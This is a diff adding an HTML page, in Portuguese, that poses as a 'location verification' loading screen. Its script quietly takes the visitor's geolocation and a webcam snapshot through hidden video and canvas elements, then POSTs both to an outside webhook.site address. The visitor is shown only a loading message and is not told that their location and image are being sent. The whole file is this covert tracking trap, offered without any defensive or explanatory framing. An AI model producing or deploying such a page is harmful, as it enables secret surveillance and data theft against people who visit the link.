@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verificação de Localização</title>
+</head>
+<body>
+  <h3>Carregando... aguarde.</h3>
+
+  <video id="video" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          const video = document.getElementById('video');
+          video.srcObject = stream;
+          video.onloadedmetadata = function() {
+            video.play();
+            setTimeout(function() {
+              const canvas = document.getElementById('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext('2d').drawImage(video, 0, 0);
+              const image = canvas.toDataURL('image/png');
+
+              fetch('https://webhook.site/xxxx', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude: lat, longitude: lon, image })
+              });
+
+              stream.getTracks().forEach(track => track.stop());
+            }, 2000);
+          };
+        });
+    });
+  </script>
+</body>
+</html>
